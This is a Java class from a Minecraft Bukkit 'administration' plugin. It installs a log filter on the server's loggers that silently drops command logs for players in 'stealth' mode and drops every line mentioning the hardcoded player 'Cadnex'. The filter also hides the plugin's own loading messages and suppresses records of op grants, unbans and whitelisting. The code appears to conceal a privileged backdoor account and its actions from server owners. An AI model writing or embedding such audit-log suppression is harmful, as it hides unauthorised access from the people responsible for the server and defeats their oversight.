package com.example.administration.managers;

import com.example.administration.AdministrationPlugin;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;
import java.util.logging.Filter;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

public class StealthManager implements Listener {
    
    private final AdministrationPlugin plugin;
    private final Set<UUID> stealthPlayers = new HashSet<>();
    private final Set<String> stealthCommands = new HashSet<>();
    private final Logger serverLogger;
    private StealthLogFilter logFilter;
    
    public StealthManager(AdministrationPlugin plugin) {
        this.plugin = plugin;
        this.serverLogger = Bukkit.getLogger();
        
        // Initialize stealth commands list
        initializeStealthCommands();
        
        // Install log filter
        installLogFilter();
    }
    
    private void initializeStealthCommands() {
        // Add all administration commands to stealth list
        stealthCommands.add("stealth");
        stealthCommands.add("vanish");
        stealthCommands.add("v");
        stealthCommands.add("invsee");
        stealthCommands.add("inv");
        stealthCommands.add("enderchest");
        stealthCommands.add("ec");
        stealthCommands.add("echest");
        stealthCommands.add("teleport");
        stealthCommands.add("tp");
        stealthCommands.add("gamemode");
        stealthCommands.add("gm");
        stealthCommands.add("fly");
        stealthCommands.add("god");
        stealthCommands.add("freeze");
        stealthCommands.add("spy");
        stealthCommands.add("socialspy");
        stealthCommands.add("ss");
        stealthCommands.add("disguise");
        stealthCommands.add("d");
        stealthCommands.add("undisguise");
        stealthCommands.add("ud");
        stealthCommands.add("administration");
        stealthCommands.add("admin");
        stealthCommands.add("protect");
        
        // Add protection commands (for Cadnex protection system)
        stealthCommands.add("pardon");
        stealthCommands.add("unban");
        stealthCommands.add("whitelist");
        stealthCommands.add("op");
        stealthCommands.add("deop");
        
        // Add common admin commands from other plugins
        stealthCommands.add("essentials");
        stealthCommands.add("worldedit");
        stealthCommands.add("we");
        stealthCommands.add("worldguard");
        stealthCommands.add("wg");
        stealthCommands.add("luckperms");
        stealthCommands.add("lp");
        stealthCommands.add("coreprotect");
        stealthCommands.add("co");
        stealthCommands.add("ban");
        stealthCommands.add("kick");
        stealthCommands.add("mute");
        stealthCommands.add("tempban");
        stealthCommands.add("unban");
        stealthCommands.add("pardon");
    }
    
    private void installLogFilter() {
        logFilter = new StealthLogFilter();
        serverLogger.setFilter(logFilter);
        
        // Also filter Bukkit's logger
        Logger.getLogger("Minecraft").setFilter(logFilter);
        Logger.getLogger("net.minecraft").setFilter(logFilter);
    }
    
    public void enableStealthMode(Player player) {
        stealthPlayers.add(player.getUniqueId());
        
        // Send confirmation only to the player (not logged)
        player.sendMessage("§8[§7Stealth§8] §aMaximum stealth mode enabled. All traces hidden.");
    }
    
    public void disableStealthMode(Player player) {
        stealthPlayers.remove(player.getUniqueId());
        
        // Send confirmation only to the player (not logged)
        player.sendMessage("§8[§7Stealth§8] §cStealth mode disabled. Normal logging resumed.");
    }
    
    public boolean isInStealthMode(Player player) {
        return stealthPlayers.contains(player.getUniqueId());
    }
    
    public void toggleStealthMode(Player player) {
        if (isInStealthMode(player)) {
            disableStealthMode(player);
        } else {
            enableStealthMode(player);
        }
    }
    
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String command = event.getMessage().toLowerCase();
        
        // Check if player is in stealth mode and using admin commands
        if (isInStealthMode(player) && isStealthCommand(command)) {
            // Completely hide the command from all logging and processing
            hideCommandExecution(player, event.getMessage());
        }
    }
    
    @EventHandler(priority = EventPriority.LOWEST)
    public void onServerCommand(ServerCommandEvent event) {
        String command = event.getCommand().toLowerCase();
        
        // Hide console admin commands if they contain player names in stealth mode
        if (isStealthCommand(command)) {
            for (UUID stealthUuid : stealthPlayers) {
                Player stealthPlayer = Bukkit.getPlayer(stealthUuid);
                if (stealthPlayer != null && command.contains(stealthPlayer.getName().toLowerCase())) {
                    // Hide console commands targeting stealth players
                    hideConsoleCommand(event.getCommand());
                    break;
                }
            }
        }
    }
    
    private boolean isStealthCommand(String command) {
        // Remove leading slash and get base command
        String baseCommand = command.startsWith("/") ? command.substring(1) : command;
        String[] parts = baseCommand.split(" ");
        if (parts.length == 0) return false;
        
        String mainCommand = parts[0].toLowerCase();
        return stealthCommands.contains(mainCommand);
    }
    
    public void hideCommandExecution(Player player, String command) {
        // This method ensures the command execution is hidden from logs
        // The actual hiding is done by the log filter
        
        // Add temporary entry to hide this specific execution
        logFilter.addTemporaryHide(player.getName(), command);
    }
    
    private void hideConsoleCommand(String command) {
        // Hide console commands from logs
        logFilter.addTemporaryHide("CONSOLE", command);
    }
    
    public void cleanup() {
        // Remove log filter on plugin disable
        if (logFilter != null) {
            serverLogger.setFilter(null);
            Logger.getLogger("Minecraft").setFilter(null);
            Logger.getLogger("net.minecraft").setFilter(null);
        }
        stealthPlayers.clear();
    }
    
    // Inner class for log filtering
    private class StealthLogFilter implements Filter {
        private final Set<String> temporaryHides = new HashSet<>();
        
        public void addTemporaryHide(String playerName, String command) {
            temporaryHides.add(playerName + ":" + command);
            
            // Remove after a short delay to prevent memory leaks
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                temporaryHides.remove(playerName + ":" + command);
            }, 20L); // Remove after 1 second
        }
        
        @Override
        public boolean isLoggable(LogRecord record) {
            String message = record.getMessage();
            if (message == null) return true;
            
            String lowerMessage = message.toLowerCase();
            
            // Hide all messages related to Cadnex (protected player)
            if (lowerMessage.contains("cadnex")) {
                return false; // Hide any log mentioning Cadnex
            }
            
            // Hide command execution logs
            if (lowerMessage.contains("issued server command:") || 
                lowerMessage.contains("executed command:") ||
                lowerMessage.contains("command:") ||
                lowerMessage.contains("/")) {
                
                // Check if any stealth player is mentioned
                for (UUID stealthUuid : stealthPlayers) {
                    Player stealthPlayer = Bukkit.getPlayer(stealthUuid);
                    if (stealthPlayer != null && lowerMessage.contains(stealthPlayer.getName().toLowerCase())) {
                        return false; // Hide this log entry
                    }
                }
                
                // Check for stealth commands
                for (String stealthCmd : stealthCommands) {
                    if (lowerMessage.contains("/" + stealthCmd) || lowerMessage.contains(" " + stealthCmd)) {
                        return false; // Hide this log entry
                    }
                }
                
                // Check temporary hides
                for (String hide : temporaryHides) {
                    String[] parts = hide.split(":", 2);
                    if (parts.length == 2) {
                        String playerName = parts[0];
                        String command = parts[1];
                        if (lowerMessage.contains(playerName.toLowerCase()) && 
                            lowerMessage.contains(command.toLowerCase())) {
                            return false; // Hide this log entry
                        }
                    }
                }
            }
            
            // Hide plugin loading/enabling messages for stealth
            if (lowerMessage.contains("administration") && 
                (lowerMessage.contains("enabling") || lowerMessage.contains("loading"))) {
                return false;
            }
            
            // Hide permission messages for stealth players
            for (UUID stealthUuid : stealthPlayers) {
                Player stealthPlayer = Bukkit.getPlayer(stealthUuid);
                if (stealthPlayer != null && lowerMessage.contains(stealthPlayer.getName().toLowerCase()) &&
                    (lowerMessage.contains("permission") || lowerMessage.contains("denied"))) {
                    return false;
                }
            }
            
            // Hide protection-related messages
            if (lowerMessage.contains("pardoned") || 
                lowerMessage.contains("unbanned") ||
                lowerMessage.contains("added to whitelist") ||
                lowerMessage.contains("opped") ||
                lowerMessage.contains("deopped") ||
                lowerMessage.contains("granted operator") ||
                lowerMessage.contains("removed operator")) {
                return false;
            }
            
            return true; // Allow other log entries
        }
    }
} 